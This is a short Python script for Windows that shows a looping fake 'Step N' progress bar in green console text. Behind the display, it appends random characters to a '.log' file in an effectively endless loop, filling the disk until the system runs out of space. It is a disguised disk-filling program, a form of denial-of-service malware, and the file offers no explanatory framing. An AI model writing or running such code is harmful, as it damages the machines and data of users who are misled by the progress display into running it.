import getpass, random, os, string, sys
path = f'C:\\Users\\{getpass.getuser()}\\log'
os.system('color 0a')
cls = lambda: os.system('cls')
step = 1
percent = 0
while True:
	cls()
	num = round(percent / 5)
	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
	open('.log', 'a').write(''.join(f'{random.choice(string.printable)}' for _ in range(int(sys.maxsize))))
	percent += 1
	if percent > 100:
		percent = 0
		step += 1
